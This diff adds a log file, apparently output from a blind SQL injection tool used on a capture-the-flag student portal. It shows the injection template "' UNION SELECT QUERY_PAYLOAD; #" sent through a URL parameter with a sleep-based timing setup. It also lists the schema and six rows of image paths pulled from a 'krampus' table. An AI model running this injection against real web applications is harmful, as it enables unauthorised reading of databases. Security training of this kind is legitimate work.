@@ -1,0 +1,37 @@
+### Setup ###
+Base URL                 : https://studentportal.elfu.org/application-check.php?elfmail=PAYLOAD&token=TOKEN
+Base Query               : ' UNION SELECT QUERY_PAYLOAD; #
+Sleep Time               : 3
+### Run ###
+Table Schema elfu Table krampus Columns [{'columnName': 'id', 'columnType': 'INT'}, {'columnName': 'path', 'columnType': 'VARCHAR'}]
+Table krampus has 6 rows
+Table krampus column id row #0 data has hex encoded length 1
+Table krampus column {'columnName': 'id', 'columnType': 'INT'} row#0 content is 1 [hex 1]
+Table krampus column path row #0 data has hex encoded length 42
+Table krampus column {'columnName': 'path', 'columnType': 'VARCHAR'} row#0 content is /krampus/0f5f510e.png [hex 2f6b72616d7075732f30663566353130652e706e67]
+Table krampus row#0 has content [1, '/krampus/0f5f510e.png']
+Table krampus column id row #1 data has hex encoded length 1
+Table krampus column {'columnName': 'id', 'columnType': 'INT'} row#1 content is 2 [hex 2]
+Table krampus column path row #1 data has hex encoded length 42
+Table krampus column {'columnName': 'path', 'columnType': 'VARCHAR'} row#1 content is /krampus/1cc7e121.png [hex 2f6b72616d7075732f31636337653132312e706e67]
+Table krampus row#1 has content [2, '/krampus/1cc7e121.png']
+Table krampus column id row #2 data has hex encoded length 1
+Table krampus column {'columnName': 'id', 'columnType': 'INT'} row#2 content is 3 [hex 3]
+Table krampus column path row #2 data has hex encoded length 42
+Table krampus column {'columnName': 'path', 'columnType': 'VARCHAR'} row#2 content is /krampus/439f15e6.png [hex 2f6b72616d7075732f34333966313565362e706e67]
+Table krampus row#2 has content [3, '/krampus/439f15e6.png']
+Table krampus column id row #3 data has hex encoded length 1
+Table krampus column {'columnName': 'id', 'columnType': 'INT'} row#3 content is 4 [hex 4]
+Table krampus column path row #3 data has hex encoded length 42
+Table krampus column {'columnName': 'path', 'columnType': 'VARCHAR'} row#3 content is /krampus/667d6896.png [hex 2f6b72616d7075732f36363764363839362e706e67]
+Table krampus row#3 has content [4, '/krampus/667d6896.png']
+Table krampus column id row #4 data has hex encoded length 1
+Table krampus column {'columnName': 'id', 'columnType': 'INT'} row#4 content is 5 [hex 5]
+Table krampus column path row #4 data has hex encoded length 42
+Table krampus column {'columnName': 'path', 'columnType': 'VARCHAR'} row#4 content is /krampus/adb798ca.png [hex 2f6b72616d7075732f61646237393863612e706e67]
+Table krampus row#4 has content [5, '/krampus/adb798ca.png']
+Table krampus column id row #5 data has hex encoded length 1
+Table krampus column {'columnName': 'id', 'columnType': 'INT'} row#5 content is 6 [hex 6]
+Table krampus column path row #5 data has hex encoded length 42
+Table krampus column {'columnName': 'path', 'columnType': 'VARCHAR'} row#5 content is /krampus/ba417715.png [hex 2f6b72616d7075732f62613431373731352e706e67]
+Table krampus row#5 has content [6, '/krampus/ba417715.png']
